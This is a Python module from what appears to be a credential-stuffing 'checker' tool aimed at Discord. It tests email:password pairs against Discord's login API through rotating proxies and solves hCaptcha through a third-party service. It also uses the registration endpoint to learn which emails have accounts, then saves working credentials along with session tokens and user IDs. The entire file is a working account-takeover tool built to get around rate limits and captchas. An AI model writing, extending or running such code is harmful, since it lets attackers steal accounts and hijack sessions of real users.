from modules.variables import Checker
from requests import Session
from modules.functions import bad_proxy, log,save,set_proxy, return_proxy
from requests.adapters import HTTPAdapter, Retry
from modules.functions import get_captcha
from string import ascii_letters as l, digits as d
from random import choices
import functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                payload = {"fingerprint":"793580565130641419.LGQ5IVlIkNTEQfpHbXcQLA2ABrM","email":email,"username":"".join(choices(l+d,k=6)),"password":"rth21e98!fmPP","invite":None,"consent":True,"date_of_birth":"1993-05-03","gift_code_sku_id":None,"captcha_key":None}
                r = s.post("https://discord.com/api/v8/auth/register",json=payload).text
                if "EMAIL_TYPE_INVALID_EMA" in r or "token" in r or "captcha-required" in r:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "EMAIL_ALREADY_REGISTERED" not  in r:
                    raise

                solution = get_captcha('f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34','https://discord.com/','hcaptcha')
                payload = {"login": email, "password": password, "undelete": "false", "captcha_key": solution,"login_source": None, "gift_code_sku_id": None}
                headers = {"Content-Type": "application/json", "accept": "*/*", "accept-language": "en-US","authorization": "undefined", "referer": "https://discord.com/login","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","x-context-properties": "eyJsb2NhdGlvbiI6IkxvZ2luIn0=","x-debug-options": "bugReporterEnabled"}
                r = s.post("https://discord.com/api/v9/auth/login", json=payload, headers=headers)
                if any(x in r.text for x in ["Login or password is invalid", '"BASE_TYPE_REQUIRED',"This account is scheduled for deletion.",'{"message": "400: Bad Request", "code": 0}', 'Not a well formed email address.','ACCOUNT_PERMANENTLY_DISABLED','This account is disabled.']):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif any(x in r.text for x in ['ACCOUNT_LOGIN_VERIFICATION_EMAIL', '{"token": null, ','Please reset your password to log in']):
                    if not Checker.cui: log('custom',':'.join([email,password]),'Discord')
                    save('Discord','custom',Checker.time,':'.join([email,password])+' | 2FA')
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif 'token' not in r.text:
                    raise
                token = r.json()['token']
                user_id = r.json()['user_id']
                if not Checker.cui: log("good",':'.join([email,password]),"Discord")
                save("Discord","good",Checker.time,':'.join([email,password,token])+f" | User ID: {user_id}")
                Checker.good += 1
                return_proxy(proxy)
                return
        except:
            return_proxy(proxy)
            bad_proxy(proxy)
            Checker.errors += 1